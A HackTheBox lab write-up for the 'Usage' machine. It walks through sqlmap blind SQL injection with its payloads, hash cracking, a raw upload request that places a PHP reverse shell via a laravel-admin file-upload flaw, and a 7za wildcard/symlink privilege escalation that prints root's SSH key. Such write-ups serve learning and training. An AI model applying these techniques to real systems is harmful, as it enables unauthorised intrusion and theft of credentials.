## Writeup for "usage" from HackTheBox


First a nmap scan was performed on the target machine to see which ports are available.


```bash
$ nmap -sC -sV 10.10.11.18
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 03:03 EDT
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 52.69% done; ETC: 03:04 (0:00:20 remaining)
Nmap scan report for 10.10.11.18
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


There is a http webserver at port 80. The nmap scan revealled the domain name "usage.htb" and this was added to /etc/hosts. Upon visiting the site, a login form appears, with links to account registration and admin in the header. The admin site leads to admin.usage.htb. This subdomain was added to /etc/hosts.


![login in page](images/image1.png)


Upon visiting admin.usage.htb, there is another login form. When examining the source code of the page, it can be seen that the server is running laravel-admin.


![admin page](images/image2.png)


Returning to usage.htb, a new user was created and when logging in, a blog post is displayed. 


![creating new user](images/image3.png)


![blogs displayed after logging in](images/image4.png)


Returning to the login page, there is a "forget password" page. Upon providing an email that exists, the page responds that an email with a reset password link was sent to the email. Otherwise, providing an email that does not exist will not lead to any message displayed.


![forget password page](images/image5.png)


The next step was to test for the possibility of SQL injections, since all pages make use of database operations. A single quote was provided to each of the forms to see if there is any unexpected responses. In the forget password page, a 500 response code was provided to the single quote. This indicates that this is vulnerable to SQL injection.


Sqlmap was used to exploit this vulnerability using:


```bash
$ sqlmap -r request.txt -p email
```


Request.txt contains the POST request that requests a reset password link to be set to the provided email. However, this original command did not lead to any exploit. This required changes to the command. This involved increasing the risk of the SQL commands and the level of thoroughness of tests performed by sqlmap.


Thus, the new command was able exploit SQL injection:


```bash
$ sqlmap -r request.txt -p email --risk=3 --level=5
sqlmap identified the following injection point(s) with a total of 696 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=aFncsmZJn6ElH6Sy6ORfvPPhdrXizcfLFviSiSTe&email=hello@thing.com' AND 5250=(SELECT (CASE WHEN (5250=5250) THEN 5250 ELSE (SELECT 2280 UNION SELECT 7262) END))-- -

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=aFncsmZJn6ElH6Sy6ORfvPPhdrXizcfLFviSiSTe&email=hello@thing.com' AND 7520=BENCHMARK(5000000,MD5(0x47757a5a))-- nEys
---
```


Next, the databases on the MySQL server can be viewed:


```bash
$ sqlmap -r request.txt -p email --risk=3 --level=5 --dbs
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=aFncsmZJn6ElH6Sy6ORfvPPhdrXizcfLFviSiSTe&email=hello@thing.com' AND 5250=(SELECT (CASE WHEN (5250=5250) THEN 5250 ELSE (SELECT 2280 UNION SELECT 7262) END))-- -

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=aFncsmZJn6ElH6Sy6ORfvPPhdrXizcfLFviSiSTe&email=hello@thing.com' AND 7520=BENCHMARK(5000000,MD5(0x47757a5a))-- nEys
---
[06:57:09] [INFO] testing MySQL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to n
[06:57:14] [INFO] confirming MySQL
[06:57:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[06:57:18] [INFO] fetching database names
[06:57:18] [INFO] fetching number of databases
[06:57:18] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:57:18] [INFO] retrieved: 3
[06:57:25] [INFO] retrieved: information_schema
[06:59:39] [INFO] retrieved: performance_schema
[07:02:02] [INFO] retrieved: usage_blog
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```


The only database here which is likely to contain interesting data would be "usage_blog". Next the tables in usage_blog were obtained:


```bash
$ sqlmap -r request.txt -p email --risk=3 --level=5 -D usage_blog --tables
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```


The admin_users table will be dumped as it would likely contain the credentials needed to log into the page in admin.usage.htb:


```bash
$ sqlmap -r request.txt -p email --risk=3 --level=5 -D usage_blog -T admin_users --dump
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2024-07-15 11:14:21 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
```


The hash provided was then cracked by John the Ripper.


```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:10 DONE (2024-07-15 07:57) 0.09225g/s 148.3p/s 148.3c/s 148.3C/s alexis1..green1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


The credentials were then used to successfully log into the page in admin.
usage.htb. Upon logging in, an admin dashboard was displayed, as well as a list of the software that is being used by the webserver. One of these is "encore/laravel-admin 1.8.18". Researching this technology for a vulnerability reveals that the dashboard is vulnerable to CVE-2023-24249, a arbitary file upload vulnerability.


![successfully logged into admin page](images/image6.png)


This is exploited by visiting the profile of the logged in admin user. There is an option to upload an image for the avatar. An attempt to upload the PHP reverse shell file from pentestmonkey/php-reverse-shell at Github was made. This was prevented. However, when pressing submit on the page, a POST request is still made.


![image upload feature found](images/image7.png)


Thus, using Burpsuite, the PHP reverse shell file was copied and pasted into the "avatar" section in the body of the POST request as shown:


```
POST /admin/auth/setting HTTP/1.1
Host: admin.usage.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-PJAX: true
X-PJAX-Container: #pjax-container
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------4114569251264458532634043821
Content-Length: 609
Origin: http://admin.usage.htb
DNT: 1
Connection: close
Referer: http://admin.usage.htb/admin/auth/setting
Cookie: laravel_session=eyJpdiI6IkpmT0tJT2swdHpud3RoYzZ1TmlBU1E9PSIsInZhbHVlIjoidTFtaG1wRkMrSi9ZS0hzVmpHZkhpZldPK01pUjlPUkdSci9yL2sxZFR2Wkx1U21oWW5mVXVsUkYzdFRjcCttK3F1aHFjV1NaV1NFcmdGalpGSFBaUFBLV3ZBVnIxUG1jWlRVWVEzTVNTdnljVTdIL3ZCaUFleUw5R04zUVdTdkoiLCJtYWMiOiI5MTc2NGM1OTNhOWQ5ZWZhNTgyNDhjMTVkNzgyYmViOTljMzkxMTViZGVhNjUwZDlkOTE3OTlmODJkMGZlZjYxIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IjFoZzQ2WnlGNHVJL0JKbVlWRHI1Mmc9PSIsInZhbHVlIjoicUR4MFVzdTBLL2pNQllRaFNRVHB5c3MrNk5pL1p3Zzd3dVE1dWpmclRRa0Y5d1JjRk1GVUozWEJqSHVUTW5UTit1bGN4QXdGc0VqRDErcUVsV0xFOXhwUFpSZWJmK0RYc21NSUVROWJUUXBQRHc3RXFYa1NBS1hhRjRiS29OMEkiLCJtYWMiOiJkNDExZTZlOGMxZTE3ZDVlOTVkYTFjODRiNjQ5Y2UzNTk3ZTg2ZGMzY2I3M2MyZWI1MWZiNGI2Njg4OTA5MTZjIiwidGFnIjoiIn0%3D; remember_admin_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IkUybjR6bnlleDEyWEdMRHJYa0FLSVE9PSIsInZhbHVlIjoiSnptUFR5QzRXRGg0NXdOd2cwS3E4VmZ4WHZYcmdEbU14RUJHTEVkS1FlUlBjOGNSRTFLcUw4ZkZpZUsrUzgyU1p5OUw2eGlQaWx4VlYyRUV2cEk5NWNPMitpV016RlphUFp2RElZdFhvVDJaVXord3FmcU8rMkhrVk9UNXUrRzBkUGtVSnAyUCtiR25wbE5KWGNwWFNvZVZ1OWhvNi9JaEI3REVJZ202dm81eUhGUjEwb3l2VkhIT3lUaGtqZmMyQmsyaUxzc0lxK2JwL3J3a01CWDVtZ2NaL216d3U5YjF6aDR5KytwTDk4az0iLCJtYWMiOiIwZGJhYWY2MTFjNzgyMTJhZTJmNmU1MzhhN2U5NGNlYjJiZmYzOWZhMmNkNmQ4YjRlYjBlMThmOWZlYzI2NTFhIiwidGFnIjoiIn0%3D

-----------------------------4114569251264458532634043821
Content-Disposition: form-data; name="name"

Administrator
-----------------------------4114569251264458532634043821
Content-Disposition: form-data; name="avatar"; filename="file.php"
Content-Type: application/php

(contents of https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

-----------------------------4114569251264458532634043821
Content-Disposition: form-data; name="_token"

rSc9SOq5h7rrmox7Gft0w5TSbLBsmTXJjGVclZwJ
-----------------------------4114569251264458532634043821
Content-Disposition: form-data; name="_method"

PUT
-----------------------------4114569251264458532634043821--
```


Upon sending this request, the webpage states that the request was successfully sent. A netcat listener was started. When visiting http://admin.usage.htb/uploads/images/file.php, where the uploaded php reverse shell is stored, this successfully triggers a reverse shell as the dash user on the usage machine.


![php reverse shell upload successful](images/image8.png)


When visiting the home directory of dash, a file .monitrc was found. When outputting the contents of this file, a password was found:


```bash
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```


There is another user in /home called xander. The password found in the above file was used to successfully log into the machine as xander through SSH.


When checking sudo permissions, it is found that xander has permission to execute /usr/bin/usage_management:


```bash
xander@usage:/home/dash$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```


The contents of /usr/bin/usage_management were then displayed:


```bash
xander@usage:/home/dash$ strings /usr/bin/usage_management
/lib64/ld-linux-x86-64.so.2
chdir
__cxa_finalize
__libc_start_main
puts
system
__isoc99_scanf
perror
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
Invalid choice.
:*3$"
GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
usage_management.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
backupMysqlData
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
chdir@GLIBC_2.2.5
backupWebContent
system@GLIBC_2.2.5
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
resetAdminPassword
perror@GLIBC_2.2.5
__isoc99_scanf@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```


This line in particular suggests that the above script has a security flaw: `/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *`.


7za is used for compressing files for archiving. Here a wildcard is used which can be exploited. A guide to exploiting wildcard vulnerabilities can be found in: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks.


To exploit this, a file called "@root.txt" was created in /var/www/html,which is where the project is contained which can be archived. "@root" has a symlink to the id_rsa file in /root/.ssh. Then the binary /usr/bin/usage_management was executed and the project is archived. During the archiving process, the contents of the root user's SSH private key will be outputted:


```bash
xander@usage:/var/www/html$ touch @root.txt
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa root.txt
xander@usage:/var/www/html$ ls
project_admin  @root.txt  root.txt  usage_blog
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 55032454

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17974 files, 114745360 bytes (110 MiB)                    

Updating archive: /var/backups/project.zip

Items to compress: 20958

 48% 8045 U project_admin/vendor/spatie/ignition/resources/compiled/ignition.j                                                                               58% 10416 U usage_blog/vendor/fakerphp/faker/src/Faker/Provider/cs_CZ/Text.ph                                                                               60% 10512 U usage_blog/vendor/fakerphp/faker/src/Faker/Provider/es_ES/Text.ph                                                                               61% 10562 U usage_blog/vendor/fakerphp/faker/src/Faker/Provider/fr_FR/Text.ph                                                                               62% 10625 U usage_blog/vendor/fakerphp/faker/src/Faker/Provider/ka_GE/Text.ph                                                                               63% 10681 U usage_blog/vendor/fakerphp/faker/src/Faker/Provider/nl_BE/Text.ph                                                                               65% 10705 U usage_blog/vendor/fakerphp/faker/src/Faker/Provider/pt_BR/Text.ph                                                                               68% 11511 U usage_blog/vendor/laravel/frame . Connectors/PostgresConnector.ph                                                                               70% 11716 U usage_blog/vendor/laravel/frame . /Illuminate/Events/composer.jso                                                                               75% 13073 U usage_blog/vendor/mockery/mockery/docs/reference/magic_methods.rs                                                                               75% 13077 U usage_blog/vendor/mockery/mocke . eference/phpunit_integration.rs                                                                               79% 13077 U usage_blog/vendor/mockery/mocke . eference/phpunit_integration.rs                                                                               88% 14497 U usage_blog/vendor/nikic/php-par . hpParser/Node/Stmt/Continue_.ph                                                                               89% 14800 U usage_blog/vendor/phpunit/php-c . enderer/Template/js/nv.d3.min.j                                                                                                                                                            
Files read from disk: 17974
Archive size: 54867505 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7
```


The contents of the private key are then used to log into the machine as the root user through SSH. Thus, the attacker successfully escalated previleges to the superuser.


Overall, the box was not too difficult. The exploit involved an SQL injection, which may take a while to uncover due to the need to tweak the Sqlmap command and deal with session timeouts (419 code errors). Hence, this box taught me more about Sqlmap and the importance of tweaking one's usage of the tools to successfully exploit a vulnerability. However, the steps to gain a foothold and escalate previleges were relatively straightforward.